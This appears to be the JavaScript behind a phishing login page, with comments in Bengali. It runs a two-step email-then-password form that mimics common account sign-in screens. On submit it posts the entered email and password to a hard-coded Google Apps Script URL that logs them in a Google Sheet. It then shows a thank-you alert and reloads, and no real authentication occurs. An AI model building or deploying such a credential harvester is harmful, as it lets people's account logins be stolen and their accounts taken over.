// Google Apps Script URL বসাও এখানে
const scriptURL = 'https://script.google.com/macros/s/AKfycbwaBp-BS_55dhh7k53JHia2xlw_oqtf9HXOzBYc1mw8jh-U2U_J9us-LjV3PsTQh-QkcA/exec';

// ফর্ম রেফারেন্স
const form = document.forms['login-form'];

// ইমেল দেওয়ার পর পাসওয়ার্ড দেখানোর ধাপ
function showPasswordStep() {
  const emailInput = form.querySelector('input[name="email"]');
  if (emailInput.checkValidity()) {
    document.getElementById('email-step').classList.add('hidden');
    document.getElementById('password-step').classList.remove('hidden');
  } else {
    emailInput.reportValidity();
  }
}

// ফর্ম সাবমিট হলে গুগল শিটে পাঠাবে
form.addEventListener('submit', (e) => {
  e.preventDefault();

  fetch(scriptURL, {
    method: 'POST',
    body: new FormData(form)
  })
  .then(response => {
    alert("ধন্যবাদ! আপনার তথ্য জমা হয়েছে।");
    form.reset();
    location.reload();
  })
  .catch(error => {
    console.error('Error!', error.message);
    alert("ত্রুটি হয়েছে! আবার চেষ্টা করুন।");
  });
});

// পাসওয়ার্ড চোখ খোলা/বন্ধ ফাংশন
function togglePassword() {
  const passwordInput = document.getElementById('password');
  const eyeOpen = document.getElementById('eye-open');
  const eyeClosed = document.getElementById('eye-closed');

  if (passwordInput.type === 'password') {
    passwordInput.type = 'text';
    eyeOpen.style.display = 'none';
    eyeClosed.style.display = 'inline';
  } else {
    passwordInput.type = 'password';
    eyeOpen.style.display = 'inline';
    eyeClosed.style.display = 'none';
  }
}
